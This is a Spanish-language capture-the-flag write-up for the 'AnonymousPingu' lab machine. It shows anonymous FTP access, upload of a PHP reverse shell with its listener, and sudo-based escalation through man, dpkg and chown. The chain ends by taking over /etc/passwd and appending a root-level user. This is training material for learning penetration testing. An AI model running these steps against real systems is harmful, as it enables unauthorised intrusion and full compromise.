# AnonymousPingu

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Como tenemos abiertos los puertos 21 y 80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p21,80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p21,80`: Escaneo de los puertos 21 (FTP) y 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28 18:28 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28 18:32 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28 21:08 upload [NSE: writeable]
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Mantenimiento
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```
Vemos que tiene habilitado el usuario **Anonymous** y que hay un directorio llamado **upload**, en el que tenemos permisos de escritura y ejecución, así que lo primero será conectarnos por ftp y subir una archivo php con una reverse shell.
```bash
ftp 172.17.0.2
```
## Explotación.
Cuando nos pida el usuario ponemos "Anonymous" y ya podemos conectarnos.
```
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:tbrux): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Para la reverse shell yo he utilizado una de pentestmonkey disponibre en  [GITHUB](https://github.com/pentestmonkey/php-reverse-shell), que simplemente es copiar y pegar en un archivo y modificar la ip y el puerto.
```
$ip = '172.17.0.1';  // CHANGE THIS
$port = 4443;       // CHANGE THIS
```
Entramos al directorio **upload** y subimos el archivo php creado.
```bash
put revershell.php
```
```
ftp> cd upload
250 Directory successfully changed.
ftp> put reverseshell.php
local: reverseshell.php remote: reverseshell.php
229 Entering Extended Passive Mode (|||14563|)
150 Ok to send data.
100% |***********************************************************************************************************************************************************************************************|  5492       63.87 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (13.09 MiB/s)
ftp> 
```
Una vez lo tenemos subido nos ponemos en escucha por el puerto que hemos configurado en el archivo **reverseshell.php**, y vamos a la dirección donde hemos subido nuesta reverse shell http://172.17.0.2/upload/reverseshell.php.
```
❯ nc -lvnp 4443
listening on [any] 4443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 39850
Linux d99fe84a5179 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 x86_64 x86_64 GNU/Linux
 07:28:44 up 22 min,  0 user,  load average: 0.54, 0.27, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
Hacemos un tratamiento de la tty.
```bash
script /dev/null -c bash
```
CTRL+Z
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export SHELL=bash
```
## Escalada de privilegios.
Comprobamos los archivos que podemo utilizar con sudo y vemos que podemos utiliazar el binario **man** para escalar privilegios al usuario **pingu**.
```bash
sudo -l
```
```www-data@d99fe84a5179:/$ sudo -l
Matching Defaults entries for www-data on d99fe84a5179:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on d99fe84a5179:
    (pingu) NOPASSWD: /usr/bin/man
```
Vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/man/)y vemos como lanzar una shell con man.
```
man man
!/bin/sh
```
```
www-data@d99fe84a5179:/$ sudo -u pingu /usr/bin/man man
MAN(1)                        Manual pager utils                        
MAN(1)

NAME
       man - an interface to the system reference manuals

SYNOPSIS
       man [man options] [[section] page ...]
 ...
       man -k [apropos options] regexp ...
       man -K [man options] [section] term ..
.
       man -f [whatis options] page ...
       man -l [man options] file ...
       man -w|-W [man options] page ...

DESCRIPTION
       man  is  the system's manual pager.  Each page argument giv
en to man is
       normally the name of a program, utility or function.  The  manual 
 page
       associated with each of these arguments is then found and displayed.  A
       section,  if  provided, will direct man to look only in tha
!/bin/sh
$ whoami
pingu
```
Ya estamos como el usuario **pingu**, hacemos lo mismo para ver si podemos seguir escalando privilegios por esta via de sudoers.
```
$ sudo -l
Matching Defaults entries for pingu on d99fe84a5179:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pingu may run the following commands on d99fe84a5179:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
$
```
Vemos que podemos utizar estos dos binario para escalar a **gladys**, y en este caso utilizaremos **dpkg** que si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/) vemos como lanzar una shell en este caso como **gladys**.
```
sudo dpkg -l
!/bin/sh
```
```
pingu@d99fe84a5179:/$ sudo -u gladys /usr/bin/dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                          Version                                 Archit
ecture Description
+++-=============================-=======================================-======
======-=========================================================================
=======
ii  adduser                       3.137ubuntu1                            all   
       add and remove users and groups
ii  apache2                       2.4.58-1ubuntu8                         amd64 
       Apache HTTP Server
ii  apache2-bin                   2.4.58-1ubuntu8                         amd64 
       Apache HTTP Server (modules and other binary files)
ii  apache2-data                  2.4.58-1ubuntu8                         all   
       Apache HTTP Server (common files)
ii  apache2-utils                 2.4.58-1ubuntu8                         amd64 
       Apache HTTP Server (utility programs for web servers)
ii  apt                           2.7.14build2                            amd64 
       commandline package manager
ii  base-files                    13ubuntu10                              amd64 
       Debian base system miscellaneous files
ii  base-passwd                   3.6.3build1                             amd64 
!bin/sh
$ whoami
gladys
```
Ahora que estamos como **gladys** probamos a seguir escalando privilegios y vemos que podemos utiliar **chown** como root.
```gladys@d99fe84a5179:/$ sudo -l
Matching Defaults entries for gladys on d99fe84a5179:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User gladys may run the following commands on d99fe84a5179:
    (root) NOPASSWD: /usr/bin/chown
gladys@d99fe84a5179:/$
```
Consultamos de nuevo [GTFOBins](https://gtfobins.github.io/gtfobins/chown/) y vemos como utiliar en este caso el binario **chown**.
```
LFILE=file_to_change
sudo chown $(id -un):$(id -gn) $LFILE
```
La idea es cambiar el propietario del archivo **/etc/passwd** para que sea propiedad de **gladys** y poder añadir un usuario nuevo root.
```
gladys@d99fe84a5179:/$ LFILE=/etc/passwd
gladys@d99fe84a5179:/$ sudo chown $(id -un):$(id -gn) $LFILE
gladys@d99fe84a5179:/$ ll /etc/passwd
-rw-r--r-- 1 gladys gladys 1292 Apr 28 21:08 /etc/passwd
```
```
openssl passwd password
echo 'tbrux:$1$V.hECIJG$KGGWPAuVvrwPgx0SP34HT/0:0:0::/home/tbrux:/bin/bash' >> /etc/passwd
su tbrux
whoami
root
```
